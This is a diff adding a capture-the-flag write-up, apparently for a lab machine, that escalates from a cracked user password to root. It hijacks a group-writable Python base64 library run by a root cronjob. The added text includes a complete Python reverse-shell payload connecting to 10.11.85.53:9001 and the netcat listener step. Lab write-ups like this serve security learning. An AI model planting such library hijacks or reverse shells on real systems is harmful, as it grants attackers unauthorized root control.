@@ -30,7 +30,39 @@ This binary is packed with UTX. To unpack it from the terminal, I run `upx -d au
 ![image](https://github.com/user-attachments/assets/681b17af-0087-43c2-a2bf-ca1f01bd2ea9)<br />
 Apparently I found two hash values. I immediately try with crackstation to crack them, and it's successful:<br />
 ![image](https://github.com/user-attachments/assets/4ae49775-9009-4bae-8c92-bf62e8d776f1)<br />
-So I used these credentials to access valley's account with the `su` command.
+So I used these credentials to access valley's account with the `su` command. Next, I checked for cronjobs with `cat /etc/crontab`:<br />
+![image](https://github.com/user-attachments/assets/48679cab-2d60-429a-bc05-1b931377d994)<br />
+A python script is executed by root every minute, and this is the code: <br />
+![image](https://github.com/user-attachments/assets/49a1ab22-941e-4da5-9596-f2d7e6b56bf1)<br />
+This script takes a set of images inside the `/script` folder and base64 encodes them. Luckily for me, I (valley) am the owner of those images!<br />
+![image](https://github.com/user-attachments/assets/b96d0616-51ed-48d3-815d-acb787ece1f0)<br />
+This means that I can create my own file named, for example, `p1.jpg` to feed this script. So for example, if I run `echo "test" > p1.jpg` and wait a few seconds, I get:<br />
+![image](https://github.com/user-attachments/assets/674900e5-5515-453b-aad0-75a119466f5d)<br />
+which is the base64 encoding of `test`. <br /><br />
+After contemplating what could be the solution to become root, I realized that the vulnerability actually relies on the fact that the base64 library is owned by the group `valleyAdmin`, which I'm part of. This means that I can just modify the code inside this library, which will be executed whenever the library is invoked.<br />
+Run:
+
+        mv /usr/lib/python3.8/base64.py /usr/lib/python3.8/base64.bak.py
+        nano /usr/lib/python3.8/base64.py
+
+Inside the new base64 fake library, I put the following code: <br >
+
+        #!/usr/bin/python3
+        from os import dup2
+        from subprocess import run
+        import socket
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect(("10.11.85.53",9001)) 
+        dup2(s.fileno(),0) 
+        dup2(s.fileno(),1) 
+        dup2(s.fileno(),2)     
+        run(["/bin/bash","-i"])
+Now I open a netcat listener on port 9001 and get a reverse root shell after a few seconds.
+
+
+
+
+
 
 
 
